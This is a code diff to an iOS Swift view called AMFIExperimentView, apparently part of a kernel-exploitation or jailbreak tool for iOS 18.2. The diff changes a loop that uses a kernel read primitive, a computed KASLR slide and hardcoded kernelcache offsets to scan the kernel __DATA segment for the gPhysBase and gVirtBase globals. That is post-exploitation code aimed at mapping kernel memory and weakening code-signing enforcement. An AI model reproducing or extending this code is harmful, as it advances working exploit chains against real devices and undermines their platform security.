@@ -3706,22 +3706,29 @@ struct AMFIExperimentView: View {
         // On iOS 18.2, they're at known offsets from kernel base
         // Let's scan for them by looking for the expected value pattern
         
+        // Scan kernel __DATA region for gPhysBase/gVirtBase
+        // From kernelcache: __DATA at unslid 0xfffffff00a0e0000
+        // Slid: __DATA = 0xfffffff00a0e0000 + kernSlide
+        let dataSegStart = 0xfffffff00a0e0000 &+ kernSlide
+        let dataSegSize: UInt64 = 0x328000  // from kernelcache
+        
         detail += "\n=== Scanning for gPhysBase/gVirtBase in kernel __DATA ===\n"
+        detail += "Scan range: 0x\(String(format: "%llx", dataSegStart)) - 0x\(String(format: "%llx", dataSegStart + dataSegSize))\n\n"
         
         // gPhysBase should contain 0x800000000 (or similar DRAM base)
         // gVirtBase should contain 0xfffffff0XXXXXXXX
         // They're typically adjacent in memory
         
-        // Scan kernel __DATA region (rough: kernBase + 0x800000 to + 0x2000000)
         var foundPhysBase: UInt64 = 0
         var foundVirtBase: UInt64 = 0
         var foundAt: UInt64 = 0
         var scanCount = 0
         
-        let scanStart = kernBase + 0x800000
-        let scanEnd = kernBase + 0x2000000
-        
-        for addr in stride(from: scanStart, to: scanEnd, by: 8) {
+        // Scan in 64-byte steps first to cover more ground quickly
+        // gPhysBase/gVirtBase are typically 8-byte aligned globals
+        // but scanning every 8 bytes over 3.2MB would timeout launchd
+        // So scan every 64 bytes (covers 2MB in ~32K reads)
+        for addr in stride(from: dataSegStart, to: dataSegStart + dataSegSize, by: 64) {
             let val = ds_kread64_safe(addr)
             scanCount += 1
             
@@ -3740,9 +3747,30 @@ struct AMFIExperimentView: View {
                 }
             }
             
-            // Safety limit
-            if scanCount > 4096 {
-                detail += "Scan limit reached (\(scanCount) reads)\n"
+            // Also check offset +8, +16, +24, +32, +40, +48, +56 within each 64-byte block
+            // But only if the first read showed something in kernel pointer range
+            if val > 0xfffffff000000000 || (val >= 0x800000000 && val <= 0x900000000) {
+                for subOff in stride(from: UInt64(8), to: UInt64(64), by: 8) {
+                    let subVal = ds_kread64_safe(addr + subOff)
+                    if subVal >= 0x800000000 && subVal <= 0x900000000 && (subVal & 0xFFF) == 0 {
+                        let nextSub = ds_kread64_safe(addr + subOff + 8)
+                        if nextSub > 0xfffffff000000000 && nextSub < 0xffffffffffffffff && (nextSub & 0xFFF) == 0 {
+                            foundPhysBase = subVal
+                            foundVirtBase = nextSub
+                            foundAt = addr + subOff
+                            detail += "🎯 FOUND gPhysBase/gVirtBase at 0x\(String(format: "%llx", addr + subOff))!\n"
+                            detail += "   gPhysBase = 0x\(String(format: "%llx", subVal))\n"
+                            detail += "   gVirtBase = 0x\(String(format: "%llx", nextSub))\n"
+                            break
+                        }
+                    }
+                }
+                if foundPhysBase != 0 { break }
+            }
+            
+            // Safety limit — prevent launchd timeout
+            if scanCount > 16384 {
+                detail += "Scan limit reached (\(scanCount) reads, covered ~\(scanCount * 64 / 1024)KB)\n"
                 break
             }
         }
